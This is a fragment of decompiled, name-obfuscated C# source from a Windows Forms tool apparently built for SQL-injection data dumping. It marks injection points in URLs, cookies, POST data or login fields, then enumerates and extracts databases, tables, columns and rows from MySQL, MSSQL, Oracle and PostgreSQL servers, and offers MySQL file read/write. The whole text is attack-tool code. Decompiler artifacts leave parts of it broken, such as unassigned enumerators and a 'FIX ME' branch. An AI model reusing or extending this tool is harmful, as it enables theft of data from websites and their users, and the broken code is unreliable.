							{
								if (this.trwSchema.SelectedNode.Parent == null)
								{
									text4 = this.method_41(this.trwSchema.SelectedNode.Text);
								}
								else
								{
									text4 = this.method_41(this.trwSchema.SelectedNode.Parent.Text);
								}
								text5 = this.method_41(this.trwSchema.SelectedNode.Text);
							}
							else
							{
								text4 = "DataBase";
								text5 = "Table";
							}
							this.class45_0.method_2(text4);
							this.class45_0.method_3(text4, text5);
							switch (this.enum4_0)
							{
							case Dumper.Enum4.const_0:
								goto IL_0AD6;
							case Dumper.Enum4.const_1:
								this.class45_0.method_4(text4, text5, this.method_41(this.trwSchema.SelectedNode.Text));
								goto IL_0AD6;
							case Dumper.Enum4.const_2:
								try
								{
									foreach (object obj in this.trwSchema.Nodes)
									{
										TreeNode treeNode = (TreeNode)obj;
										this.class45_0.method_4(text4, text5, this.method_41(treeNode.Text));
									}
									goto IL_0AD6;
								}
								finally
								{
									IEnumerator enumerator2;
									if (enumerator2 is IDisposable)
									{
										(enumerator2 as IDisposable).Dispose();
									}
								}
								break;
							case Dumper.Enum4.const_3:
								break;
							case Dumper.Enum4.const_4:
								try
								{
									foreach (object obj2 in this.trwSchema.SelectedNode.Parent.Nodes)
									{
										TreeNode treeNode2 = (TreeNode)obj2;
										this.class45_0.method_4(text4, text5, this.method_41(treeNode2.Text));
									}
									goto IL_0AD6;
								}
								finally
								{
									IEnumerator enumerator3;
									if (enumerator3 is IDisposable)
									{
										(enumerator3 as IDisposable).Dispose();
									}
								}
								goto IL_068A;
							case Dumper.Enum4.const_5:
								goto IL_068A;
							case Dumper.Enum4.const_6:
								try
								{
									foreach (object obj3 in this.trwSchema.SelectedNode.Parent.Nodes)
									{
										TreeNode treeNode3 = (TreeNode)obj3;
										this.class45_0.method_4(text4, text5, this.method_41(treeNode3.Text));
									}
									goto IL_0AD6;
								}
								finally
								{
									IEnumerator enumerator4;
									if (enumerator4 is IDisposable)
									{
										(enumerator4 as IDisposable).Dispose();
									}
								}
								goto IL_0721;
							default:
								goto IL_0AD6;
							}
							this.class45_0.method_4(text4, text5, this.method_41(this.trwSchema.SelectedNode.Text));
							goto IL_0AD6;
							IL_068A:
							this.class45_0.method_4(text4, text5, this.method_41(this.trwSchema.SelectedNode.Text));
							goto IL_0AD6;
						}
						IL_0721:
						if (this.enum5_0 > Dumper.Enum5.const_0)
						{
							if (this.trwSchema.SelectedNode != null)
							{
								TreeNode selectedNode = this.trwSchema.SelectedNode;
								string[] array3 = selectedNode.FullPath.Split(new char[] { Conversions.ToChar(selectedNode.TreeView.PathSeparator) });
								int num = array3.Length - 1;
								for (int j = 0; j <= num; j++)
								{
									array3[j] = this.method_41(array3[j]);
								}
								switch (selectedNode.Level)
								{
								case 0:
									this.class45_0.method_2(array3[0]);
									break;
								case 1:
								case 2:
								case 3:
									this.class45_0.method_2(array3[0]);
									this.class45_0.method_3(array3[0], array3[1]);
									if (selectedNode.Level == 1)
									{
										try
										{
											foreach (object obj4 in selectedNode.Nodes)
											{
												TreeNode treeNode4 = (TreeNode)obj4;
												if (treeNode4.Checked)
												{
													this.class45_0.method_4(array3[0], array3[1], treeNode4.Text);
												}
											}
											break;
										}
										finally
										{
											IEnumerator enumerator5;
											if (enumerator5 is IDisposable)
											{
												(enumerator5 as IDisposable).Dispose();
											}
										}
									}
									if (selectedNode.Level == 2)
									{
										try
										{
											foreach (object obj5 in selectedNode.Parent.Nodes)
											{
												TreeNode treeNode5 = (TreeNode)obj5;
												if (treeNode5.Checked)
												{
													this.class45_0.method_4(array3[0], array3[1], treeNode5.Text);
												}
											}
											break;
										}
										finally
										{
											IEnumerator enumerator6;
											if (enumerator6 is IDisposable)
											{
												(enumerator6 as IDisposable).Dispose();
											}
										}
									}
									if (selectedNode.Level == 2)
									{
										try
										{
											foreach (object obj6 in selectedNode.Parent.Parent.Nodes)
											{
												TreeNode treeNode6 = (TreeNode)obj6;
												if (treeNode6.Checked)
												{
													this.class45_0.method_4(array3[0], array3[1], treeNode6.Text);
												}
											}
										}
										finally
										{
											IEnumerator enumerator7;
											if (enumerator7 is IDisposable)
											{
												(enumerator7 as IDisposable).Dispose();
											}
										}
									}
									break;
								}
							}
							switch (enum5_1)
							{
							case Dumper.Enum5.const_2:
								if (this.class45_0.method_1() == 0)
								{
									this.UpDateStatus(global::Globals.translate_0.GetStr(this, 13, ""), false);
									Interaction.Beep();
									return;
								}
								break;
							case Dumper.Enum5.const_3:
							{
								bool flag3;
								try
								{
									foreach (KeyValuePair<string, Dumper.Class45.Class46> keyValuePair2 in this.class45_0.dictionary_0)
									{
										if (flag3 = !string.IsNullOrEmpty(keyValuePair2.Value.DataBase))
										{
											break;
										}
									}
								}
								finally
								{
									Dictionary<string, Dumper.Class45.Class46>.Enumerator enumerator8;
									((IDisposable)enumerator8).Dispose();
								}
								if (!flag3)
								{
									this.UpDateStatus(global::Globals.translate_0.GetStr(this, 14, ""), false);
									Interaction.Beep();
									return;
								}
								break;
							}
							case Dumper.Enum5.const_4:
							{
								bool flag4;
								try
								{
									foreach (KeyValuePair<string, Dumper.Class45.Class46> keyValuePair3 in this.class45_0.dictionary_0)
									{
										if (flag4 = !string.IsNullOrEmpty(keyValuePair3.Value.Table) && keyValuePair3.Value.Columns.Count > 0)
										{
											break;
										}
									}
								}
								finally
								{
									Dictionary<string, Dumper.Class45.Class46>.Enumerator enumerator9;
									((IDisposable)enumerator9).Dispose();
								}
								if (!flag4)
								{
									this.UpDateStatus(global::Globals.translate_0.GetStr(this, 15, ""), false);
									Interaction.Beep();
									return;
								}
								break;
							}
							}
						}
						else if (this.enum5_0 == Dumper.Enum5.const_0)
						{
							this.method_3("", "", null);
						}
					}
					IL_0AD6:
					this.method_2(this.enum5_0, false);
					this.bool_2 = true;
					this.bckWorker.RunWorkerAsync();
				}
			}
		}
	}

	// Token: 0x0600065F RID: 1631 RVA: 0x00024E40 File Offset: 0x00023040
	private void method_1(string string_9)
	{
		string text = "";
		switch (this.enum5_0)
		{
		case Dumper.Enum5.const_1:
			text = "dataBases";
			break;
		case Dumper.Enum5.const_2:
			text = "tables";
			break;
		case Dumper.Enum5.const_3:
			text = "columns";
			break;
		case Dumper.Enum5.const_4:
			text = "rows";
			break;
		case Dumper.Enum5.const_5:
			text = "rows";
			break;
		}
		checked
		{
			if ((this.enum5_0 == Dumper.Enum5.const_0) | (this.enum5_0 == Dumper.Enum5.const_6))
			{
				this.UpDateStatus(string_9, true);
			}
			else if (this.enum5_0 == Dumper.Enum5.const_8)
			{
				this.UpDateStatus(global::Globals.translate_0.GetStr(this, 16, ""), true);
			}
			else if (this.enum5_0 == Dumper.Enum5.const_7)
			{
				if (this.class44_0.RowsAdded == 1)
				{
					this.UpDateStatus(global::Globals.translate_0.GetStr(this, 17, ""), true);
				}
				else
				{
					this.UpDateStatus(global::Globals.translate_0.GetStr(this, 18, "") + string_9, true);
				}
			}
			else if (this.enum5_0 == Dumper.Enum5.const_9)
			{
				this.UpDateStatus(string_9, true);
			}
			else
			{
				int num = this.class44_0.RowsAdded;
				int num2;
				if (decimal.Compare(this.numLimitMax.Value, 0m) > 0)
				{
					num2 = Convert.ToInt32(this.numLimitMax.Value);
				}
				else
				{
					num2 = this.class44_0.AffectedRows;
				}
				if (this.method_10())
				{
					num2 *= this.int_1;
					num *= this.int_1;
				}
				string text2 = "";
				bool flag = Class54.smethod_11(this.types_0);
				if (((num2 != 32767) & !(flag & (this.enum5_0 == Dumper.Enum5.const_1))) && num < num2)
				{
					text2 = string.Concat(new string[]
					{
						" / ",
						Conversions.ToString(num2),
						", ",
						global::Globals.translate_0.GetStr(this, 19, ""),
						" ",
						Conversions.ToString(num2 - num),
						" ",
						text
					});
				}
				this.UpDateStatus(string.Concat(new string[]
				{
					string_9,
					", ",
					text,
					" ",
					global::Globals.translate_0.GetStr(this, 20, ""),
					" ",
					Conversions.ToString(num),
					text2
				}), true);
			}
			if ((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5))
			{
				this.dumpGrid_0 = null;
			}
			this.bool_2 = false;
			this.method_2(this.enum5_0, true);
			this.class44_0 = null;
			this.class45_0 = null;
		}
	}

	// Token: 0x06000660 RID: 1632 RVA: 0x000250E4 File Offset: 0x000232E4
	internal void method_2(Dumper.Enum5 enum5_1, bool bool_6)
	{
		if (!this.Boolean_0)
		{
			bool flag = !bool_6 && this.chkClearListOnGet.Checked;
			this.btnPasteURL.Enabled = bool_6;
			this.txtURL.SelectionStart = 0;
			this.txtURL.SelectionLength = 1;
			this.txtURL.Enabled = bool_6;
			this.cmbMethod.Enabled = bool_6;
			this.cmbSqlType.Enabled = bool_6;
			this.btnLoadDefautSettings.Enabled = bool_6;
			this.btnServerInfo.Enabled = bool_6;
			this.btnDataBases.Enabled = bool_6;
			this.btnTables.Enabled = bool_6;
			this.btnColumns.Enabled = bool_6;
			this.btnDumpData.Enabled = bool_6;
			this.btnDumpCustom.Enabled = bool_6;
			this.grbMSSQLCollactions.Enabled = bool_6;
			this.grbMySQLCollactions.Enabled = bool_6;
			this.grbOracleCollactions.Enabled = bool_6;
			this.grbMySQLSplitRows.Enabled = bool_6;
			this.grbLogin.Enabled = bool_6;
			this.chkThreads.Enabled = bool_6;
			this.numThreads.Enabled = bool_6;
			this.numThreads.Enabled = bool_6;
			this.numLimitX.Enabled = bool_6;
			this.cmbInjectionPoint.Enabled = bool_6;
			this.chkDumpFieldByField.Enabled = bool_6;
			this.numFieldByField.Enabled = bool_6;
			this.chkDumpEncodedHex.Enabled = bool_6;
			this.chkDumpWhere.Enabled = bool_6;
			this.chkDumpOrderBy.Enabled = bool_6;
			this.chkAllInOneRequest.Enabled = bool_6;
			this.chkDumpIFNULL.Enabled = bool_6;
			this.grbInjectionPoint.Enabled = bool_6;
			if (bool_6)
			{
				this.numLimitMax.Value = 0m;
				this.numFieldByField.Enabled = this.chkDumpFieldByField.Checked;
			}
			this.numLimitMax.Enabled = bool_6;
			this.btnMySQLReadFile.Enabled = bool_6;
			this.btnMySQLWriteFile.Enabled = bool_6;
			switch (enum5_1)
			{
			case Dumper.Enum5.const_0:
				if (flag)
				{
					this.string_0 = "";
					this.lblCountBDs.Text = "-1";
					this.trwSchema.Nodes.Clear();
					this.method_32(null);
					this.txtSearchColumnResult.Clear();
					bool flag2;
					if ((flag2 = true) == this.txtURL.Text.IndexOf("[t]") > 0)
					{
						this.cmbInjectionPoint.SelectedIndex = 0;
					}
					else if (flag2 == this.txtCookies.Text.IndexOf("[t]") >= 0)
					{
						this.cmbInjectionPoint.SelectedIndex = 1;
					}
					else if (flag2 == this.txtPost.Text.IndexOf("[t]") >= 0)
					{
						this.cmbInjectionPoint.SelectedIndex = 2;
					}
					else if (flag2 == this.txtUserName.Text.IndexOf("[t]") >= 0)
					{
						this.cmbInjectionPoint.SelectedIndex = 3;
					}
					else if (flag2 == this.txtPassword.Text.IndexOf("[t]") >= 0)
					{
						this.cmbInjectionPoint.SelectedIndex = 4;
					}
				}
				this.chkDumpWhere.Checked = false;
				this.chkDumpOrderBy.Checked = false;
				this.numLimitX.Value = this.numLimitX.Minimum;
				break;
			case Dumper.Enum5.const_1:
				if (flag)
				{
					this.trwSchema.Nodes.Clear();
				}
				break;
			case Dumper.Enum5.const_2:
				if (flag)
				{
					TreeNode selectedNode = this.trwSchema.SelectedNode;
					if (selectedNode.Level == 0)
					{
						selectedNode.Nodes.Clear();
					}
				}
				if (bool_6 && this.trwSchema.Nodes.ContainsKey(this.class45_0.method_0(0).DataBase))
				{
					this.trwSchema.Nodes[this.class45_0.method_0(0).DataBase].EnsureVisible();
				}
				break;
			case Dumper.Enum5.const_3:
				if (flag)
				{
					TreeNode selectedNode2 = this.trwSchema.SelectedNode;
					if (selectedNode2.Level == 1)
					{
						selectedNode2.Nodes.Clear();
					}
					else if (selectedNode2.Level == 2)
					{
						selectedNode2.Parent.Nodes.Clear();
					}
					else if (selectedNode2.Level == 3)
					{
						selectedNode2.Parent.Parent.Nodes.Clear();
					}
				}
				if (bool_6 && this.trwSchema.Nodes.ContainsKey(this.class45_0.method_0(0).Table))
				{
					this.trwSchema.Nodes[this.class45_0.method_0(0).Table].EnsureVisible();
				}
				break;
			case Dumper.Enum5.const_6:
				if ((this.enum4_0 == Dumper.Enum4.const_0) & !bool_6)
				{
					this.lblCountBDs.Text = "-1";
				}
				break;
			case Dumper.Enum5.const_7:
			case Dumper.Enum5.const_8:
				this.txtMySQLReadFilePath.ReadOnly = !bool_6;
				this.txtMySQLWriteFile.ReadOnly = !bool_6;
				this.txtMySQLWriteFilePath.ReadOnly = !bool_6;
				this.cmbMySQLWriteFilePath.Enabled = bool_6;
				break;
			case Dumper.Enum5.const_9:
				this.tsSearchColumn.Enabled = bool_6;
				if (!bool_6)
				{
					this.txtSearchColumnResult.Clear();
				}
				break;
			}
			if (!bool_6)
			{
				this.dumpLoading_0 = new DumpLoading(this, ProgressBarStyle.Blocks);
				this.dumpLoading_0.grbBack.Text = this.string_4;
				this.splData.Panel1.Controls.Add(this.dumpLoading_0.grbBack);
				this.dumpLoading_0.Dock = DockStyle.Bottom;
				this.dumpLoading_0.BringToFront();
				global::Globals.AddMouseMoveForm(this.dumpLoading_0);
				this.dumpLoading_0.tstMain.AutoSize = false;
				this.dumpLoading_0.OnPause += this.dumpLoading_0_OnPause;
				this.dumpLoading_0.OnCancel += this.LoadingOnCancel;
				this.UpDateStatus(this.string_4, false);
			}
			else
			{
				this.splData.Panel1.Controls.Remove(this.dumpLoading_0.grbBack);
				this.dumpLoading_0.Dispose();
				this.method_56(null, null);
				this.method_99(null, null);
			}
			global::Globals.G_Taskbar.SetProgressValue(0, 100);
			if (bool_6)
			{
				global::Globals.G_Taskbar.SetProgressState(ProgressBarState.NoProgress);
			}
			else
			{
				global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
			}
		}
	}

	// Token: 0x06000661 RID: 1633 RVA: 0x00025754 File Offset: 0x00023954
	internal void method_3(string string_9, string string_10, Image image_0)
	{
		if (this.tsGetInfo.InvokeRequired)
		{
			this.tsGetInfo.Invoke(new Dumper.Delegate25(this.method_3), new object[] { string_9, string_10, image_0 });
		}
		else
		{
			string_9 = string_9.Trim();
			this.lblVersion.Text = string_9;
			this.lblCountry.Text = string_10;
			this.lblCountry.Image = image_0;
			if (string_9.StartsWith("4"))
			{
				this.lblVersion.ForeColor = Color.Red;
			}
			else if (!string.IsNullOrEmpty(string_9))
			{
				this.lblVersion.ForeColor = Color.Blue;
			}
			else
			{
				this.lblVersion.ForeColor = this.ForeColor;
			}
		}
	}

	// Token: 0x17000244 RID: 580
	// (get) Token: 0x06000662 RID: 1634 RVA: 0x00025818 File Offset: 0x00023A18
	internal string String_0
	{
		get
		{
			return this.string_0;
		}
	}

	// Token: 0x06000663 RID: 1635 RVA: 0x00025830 File Offset: 0x00023A30
	public void UpDateStatus(string sDesc, bool bMain = false)
	{
		if ((this.dumpLoading_0 == null || bMain) | global::Globals.IS_DUMP_INSTANCE | !global::Globals.GMain.Boolean_1)
		{
			global::Globals.GMain.method_1(sDesc);
		}
		else
		{
			this.dumpLoading_0.method_2(sDesc);
		}
	}

	// Token: 0x06000664 RID: 1636 RVA: 0x0002586C File Offset: 0x00023A6C
	internal void method_4(string string_9)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new Dumper.Delegate20(this.method_4), new object[] { string_9 });
		}
		else
		{
			this.dumpLoading_0.method_1(ProgressBarStyle.Blocks);
			bool flag;
			this.dumpLoading_0.method_0(Conversions.ToInteger(string_9), ref flag);
			if (flag)
			{
				this.bckWorker.CancelAsync();
			}
		}
	}

	// Token: 0x17000245 RID: 581
	// (get) Token: 0x06000665 RID: 1637 RVA: 0x000258D0 File Offset: 0x00023AD0
	internal bool Boolean_0
	{
		get
		{
			return this.bool_2;
		}
	}

	// Token: 0x17000246 RID: 582
	// (get) Token: 0x06000666 RID: 1638 RVA: 0x000258D8 File Offset: 0x00023AD8
	internal int Int32_0
	{
		get
		{
			int num;
			if (this.dumpLoading_0 != null)
			{
				if (this.dumpLoading_0.prgStatus.Style == ProgressBarStyle.Marquee)
				{
					num = 0;
				}
				else
				{
					num = this.dumpLoading_0.prgStatus.Value;
				}
			}
			else
			{
				num = 0;
			}
			return num;
		}
	}

	// Token: 0x17000247 RID: 583
	// (get) Token: 0x06000667 RID: 1639 RVA: 0x00025920 File Offset: 0x00023B20
	internal int Int32_1
	{
		get
		{
			int num;
			if (this.threadPool_0 != null)
			{
				num = this.threadPool_0.ThreadCount;
			}
			else
			{
				num = 0;
			}
			return num;
		}
	}

	// Token: 0x06000668 RID: 1640 RVA: 0x0002594C File Offset: 0x00023B4C
	private void method_5(int int_3)
	{
		if (this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init, ref flag);
			if (this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init.State == 0)
			{
				this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init.State = 2;
				this.$STATIC$CheckRequestDelay$20118$LastRequestDelay = DateAndTime.Now.AddHours(-1.0);
			}
			else if (this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
			goto IL_0098;
		}
		finally
		{
			this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this.$STATIC$CheckRequestDelay$20118$LastRequestDelay$Init);
			}
		}
		IL_0091:
		Thread.Sleep(100);
		IL_0098:
		if (DateAndTime.Now.Subtract(this.$STATIC$CheckRequestDelay$20118$LastRequestDelay).TotalMilliseconds > (double)int_3)
		{
			this.$STATIC$CheckRequestDelay$20118$LastRequestDelay = DateAndTime.Now;
			return;
		}
		goto IL_0091;
	}

	// Token: 0x06000669 RID: 1641 RVA: 0x00025A30 File Offset: 0x00023C30
	private object method_6(object object_0)
	{
		object obj;
		if (base.InvokeRequired)
		{
			obj = base.Invoke(new global::Globals.DGetObjectValue(this.method_6), new object[] { object_0 });
		}
		else
		{
			this.numLimitMax.Enabled = Conversions.ToBoolean(object_0);
			obj = null;
		}
		return obj;
	}

	// Token: 0x0600066A RID: 1642 RVA: 0x00025A78 File Offset: 0x00023C78
	public void LoadingOnCancel()
	{
		if (this.bool_2)
		{
			this.bckWorker.CancelAsync();
		}
	}

	// Token: 0x0600066B RID: 1643 RVA: 0x00025A90 File Offset: 0x00023C90
	private object method_7(object object_0)
	{
		object obj;
		bool flag;
		if (base.InvokeRequired)
		{
			obj = base.Invoke(new global::Globals.DGetObjectValue(this.method_7), new object[] { object_0 });
		}
		else if ((flag = true) == object_0 is ComboBox)
		{
			if (object_0 == this.cmbMSSQLCast)
			{
				obj = ((ComboBox)object_0).Text.Trim();
			}
			else
			{
				obj = ((ComboBox)object_0).SelectedIndex;
			}
		}
		else if (flag == object_0 is TextBox)
		{
			obj = ((TextBox)object_0).Text;
		}
		else if (flag == object_0 is CheckBox)
		{
			obj = ((CheckBox)object_0).Checked;
		}
		else if (flag == object_0 is RadioButton)
		{
			obj = ((RadioButton)object_0).Checked;
		}
		else if (flag == object_0 is ToolStripButton)
		{
			obj = ((ToolStripButton)object_0).Checked;
		}
		else if (flag == object_0 is ToolStripLabel)
		{
			obj = ((ToolStripLabel)object_0).Text;
		}
		else if (flag == object_0 is NumericUpDown)
		{
			obj = ((NumericUpDown)object_0).Value;
		}
		else if (flag == object_0 is TrackBar)
		{
			obj = ((TrackBar)object_0).Value;
		}
		else if (flag == object_0 is TreeViewExt)
		{
			obj = ((TreeViewExt)object_0).Handle;
		}
		else if (flag == object_0 is ToolStripSpringTextBox)
		{
			obj = ((ToolStripSpringTextBox)object_0).Text;
		}
		else if (flag == object_0 is ToolStripMenuItem)
		{
			obj = ((ToolStripMenuItem)object_0).Text;
		}
		else if (flag == object_0 is ToolStripTextBox)
		{
			obj = ((ToolStripTextBox)object_0).Text;
		}
		else
		{
			if (flag != object_0 is ToolStripComboBox)
			{
				throw new Exception("Bad Changed GetObjectValue");
			}
			obj = ((ToolStripComboBox)object_0).SelectedIndex;
		}
		return obj;
	}

	// Token: 0x0600066C RID: 1644 RVA: 0x00025CA8 File Offset: 0x00023EA8
	private void method_8(object object_0, object object_1)
	{
		bool flag;
		if (base.InvokeRequired)
		{
			base.Invoke(new global::Globals.DSetObjectValue(this.method_8), new object[] { object_0, object_1 });
		}
		else if ((flag = true) == object_0 is ComboBox)
		{
			if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(object_1)))
			{
				((ComboBox)object_0).SelectedIndex = Conversions.ToInteger(object_1);
			}
			else
			{
				((ComboBox)object_0).Text = Conversions.ToString(object_1);
			}
		}
		else if (flag == object_0 is TextBox)
		{
			((TextBox)object_0).Text = Conversions.ToString(object_1);
		}
		else if (flag == object_0 is CheckBox)
		{
			((CheckBox)object_0).Checked = Conversions.ToBoolean(object_1);
		}
		else if (flag == object_0 is RadioButton)
		{
			((RadioButton)object_0).Checked = Conversions.ToBoolean(object_1);
		}
		else if (flag == object_0 is ToolStripButton)
		{
			((ToolStripButton)object_0).Checked = Conversions.ToBoolean(object_1);
		}
		else if (flag == object_0 is ToolStripLabel)
		{
			((ToolStripLabel)object_0).Text = Conversions.ToString(object_1);
		}
		else if (flag == object_0 is NumericUpDown)
		{
			((NumericUpDown)object_0).Value = Conversions.ToDecimal(object_1);
		}
		else
		{
			if (flag != object_0 is TrackBar)
			{
				throw new Exception("Bad Changed SetObjectValue");
			}
			((TrackBar)object_0).Value = Conversions.ToInteger(object_1);
		}
	}

	// Token: 0x0600066D RID: 1645 RVA: 0x00025E28 File Offset: 0x00024028
	private void method_9()
	{
		this.string_5 = this.string_1;
		this.string_6 = "";
		this.int_1 = 0;
		checked
		{
			int num = this.string_1.Length - 4;
			for (int i = 0; i <= num; i++)
			{
				string text = this.string_1.Substring(i, 3);
				if (text.Equals("[t]"))
				{
					if (this.int_1 > 0)
					{
						text = this.string_5;
						text = text.Remove(i, 3);
						text = text.Insert(i, "_|_");
						if (string.IsNullOrEmpty(this.string_6))
						{
							this.string_6 = text;
							this.string_6 = this.string_6.Replace("[t]", "0");
							this.string_6 = this.string_6.Replace("_|_", "[t]");
						}
						text = text.Replace("_|_", "[t" + Conversions.ToString(this.int_1));
						this.string_5 = text;
					}
					ref int ptr = ref this.int_1;
					this.int_1 = ptr + 1;
				}
			}
			if (string.IsNullOrEmpty(this.string_6))
			{
				this.string_6 = this.string_1;
			}
		}
	}

	// Token: 0x0600066E RID: 1646 RVA: 0x00025F54 File Offset: 0x00024154
	private bool method_10()
	{
		bool flag;
		if (((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5)) && ((this.types_0 == Types.MySQL_No_Error) | (this.types_0 == Types.MSSQL_No_Error) | (this.types_0 == Types.Oracle_No_Error) | (this.types_0 == Types.PostgreSQL_No_Error)))
		{
			flag = Conversions.ToBoolean(Conversions.ToBoolean(Operators.NotObject(this.method_7(this.chkDumpFieldByField))) && this.int_1 > 1);
		}
		return flag;
	}

	// Token: 0x0600066F RID: 1647 RVA: 0x00025FD4 File Offset: 0x000241D4
	private void method_11(object sender, DoWorkEventArgs e)
	{
		string text = "";
		checked
		{
			try
			{
				this.appDomainControl_0 = new AppDomainControl();
				this.int_2 = -1;
				Conversions.ToBoolean(this.method_7(this.chkDumpFieldByField));
				int num = Conversions.ToInteger(this.method_7(this.numLimitX));
				int num2 = 1;
				int num3 = Conversions.ToInteger(this.method_7(this.numLimitMax));
				this.threadPool_0 = new global::ThreadPool(1);
				bool flag;
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(this.method_7(this.chkAllInOneRequest), this.types_0 == Types.MySQL_No_Error), this.enum5_0 != Dumper.Enum5.const_4), this.enum5_0 != Dumper.Enum5.const_5), this.enum5_0 != Dumper.Enum5.const_6)))
				{
					flag = true;
				}
				this.method_9();
				if ((num3 == 1) | ((this.enum5_0 == Dumper.Enum5.const_0) | (this.enum5_0 == Dumper.Enum5.const_7) | (this.enum5_0 == Dumper.Enum5.const_8)) | ((this.enum5_0 == Dumper.Enum5.const_6) & ((this.enum4_0 == Dumper.Enum4.const_0) | (this.enum4_0 == Dumper.Enum4.const_1) | (this.enum4_0 == Dumper.Enum4.const_3) | (this.enum4_0 == Dumper.Enum4.const_5))))
				{
					this.int_2 = 1;
				}
				else
				{
					this.dumpLoading_0.method_1(ProgressBarStyle.Marquee);
					this.UpDateStatus(global::Globals.translate_0.GetStr(this, 21, ""), false);
					if (this.enum5_0 == Dumper.Enum5.const_5)
					{
						if (!this.class45_0.method_0(0).Query.ToLower().Contains("[x]"))
						{
							this.int_2 = 1;
						}
						else
						{
							this.int_2 = this.method_19(Schema.ROWS, "", "", ref text);
							this.enum4_0 = Dumper.Enum4.const_5;
						}
					}
					else
					{
						if (this.enum5_0 != Dumper.Enum5.const_6)
						{
							bool flag2 = Conversions.ToBoolean(this.method_7(this.chkDumpWhere));
							switch (this.enum5_0)
							{
							case Dumper.Enum5.const_1:
								int.TryParse(Conversions.ToString(this.method_7(this.lblCountBDs)), out this.int_2);
								if ((this.int_2 <= 0 || flag2) && !flag2)
								{
									this.method_8(this.lblCountBDs, this.int_2.ToString());
								}
								this.enum4_0 = Dumper.Enum4.const_0;
								break;
							case Dumper.Enum5.const_2:
								this.int_2 = this.method_44(Schema.DATABASES, this.class45_0.method_0(0).DataBase, "", "");
								if ((this.int_2 <= 0 || flag2) && !flag2)
								{
									this.method_43(Schema.DATABASES, this.class45_0.method_0(0).DataBase, "", "", this.int_2.ToString(), "");
								}
								this.enum4_0 = Dumper.Enum4.const_1;
								break;
							case Dumper.Enum5.const_3:
								this.int_2 = this.method_44(Schema.TABLES, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, "");
								if ((this.int_2 <= 0 || flag2) && !flag2)
								{
									this.method_43(Schema.TABLES, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, "", this.int_2.ToString(), "");
								}
								this.enum4_0 = Dumper.Enum4.const_3;
								break;
							case Dumper.Enum5.const_4:
								this.int_2 = this.method_44(Schema.ROWS, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, "");
								if (this.int_2 <= 0 || flag2)
								{
									this.enum4_0 = Dumper.Enum4.const_5;
									if (!flag2)
									{
										this.method_43(Schema.TABLES, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, "", "", this.int_2.ToString());
									}
								}
								this.enum4_0 = Dumper.Enum4.const_5;
								break;
							case Dumper.Enum5.const_5:
							case Dumper.Enum5.const_6:
							case Dumper.Enum5.const_7:
							case Dumper.Enum5.const_8:
								goto IL_0D55;
							case Dumper.Enum5.const_9:
							{
								Analyzer analyzer = new Analyzer(Conversions.ToString(this.method_7(this.txtURL)), 1, new HTTPExt(true, false));
								DataSearch dataSearch = new DataSearch(Conversions.ToString(this.method_7(this.txtURL)), analyzer, true);
								analyzer.DBType = this.types_0;
								if (analyzer.CheckVersionNoCollactions(Conversions.ToString(this.method_7(this.txtURL)), false))
								{
									dataSearch.CurrentDB = !Conversions.ToBoolean(this.method_7(this.chkSearchColumnAllDBs));
									dataSearch.OnDataChanged += this.method_159;
									if (dataSearch.SearchColumn(this.string_8) == 0L)
									{
										this.method_159(global::Globals.translate_0.GetStr(this, 22, ""));
									}
									else
									{
										this.method_159(string.Concat(new string[]
										{
											"\r\n[ ",
											this.string_8,
											" ] ",
											global::Globals.translate_0.GetStr(Class2.Class3_0.SearchColumn_0.Name, "mnuRowsCount", ""),
											" ",
											global::Globals.FormatNumbers(dataSearch.RowsCount, false)
										}));
									}
								}
								else
								{
									this.method_159(global::Globals.translate_0.GetStr(global::Globals.GMain, 88, ""));
								}
								e.Result = global::Globals.translate_0.GetStr(this, 28, "").Trim();
								goto IL_0ED1;
							}
							default:
								goto IL_0D55;
							}
							if (this.enum4_0 != Dumper.Enum4.const_7)
							{
								Thread thread = new Thread(new ParameterizedThreadStart(this.method_160));
								Dumper.Class47 @class = new Dumper.Class47(thread, 0, 0);
								Dumper.Enum5 @enum = this.enum5_0;
								if (@enum != Dumper.Enum5.const_1)
								{
									@class.DataBase = this.class45_0.method_0(0).DataBase;
									@class.Table = this.class45_0.method_0(0).Table;
									@class.Columns = this.class45_0.method_0(0).Columns;
								}
								thread.Start(@class);
								this.threadPool_0.Open(thread);
								while (!this.WorkedRequestStop() && this.threadPool_0.ThreadCount != 0)
								{
									Thread.Sleep(100);
								}
							}
							if (num > 1)
							{
								ref int ptr = ref this.int_2;
								this.int_2 = ptr - num;
							}
							if (!(this.WorkedRequestStop() | (this.int_2 <= 0)))
							{
								goto IL_0528;
							}
							goto IL_0ED1;
							IL_0D55:
							Interaction.MsgBox("FIX ME", MsgBoxStyle.OkOnly, null);
							return;
						}
						this.int_2 = this.class45_0.method_0(0).Columns.Count;
					}
				}
				IL_0528:
				if (this.int_2 > 1 && this.method_10())
				{
					this.int_2 = (int)Math.Round(Math.Round((double)this.int_2 / (double)this.int_1, 0));
				}
				if (this.int_2 <= 0)
				{
					Interaction.Beep();
					if (string.IsNullOrEmpty(text))
					{
						e.Result = global::Globals.translate_0.GetStr(this, 22, "");
					}
					else
					{
						e.Result = text;
					}
					return;
				}
				if (num3 == 0)
				{
					this.method_8(this.numLimitMax, this.int_2);
				}
				int num4;
				int num5;
				if (flag | (num3 == 1))
				{
					num4 = 1;
					num5 = 1;
				}
				else
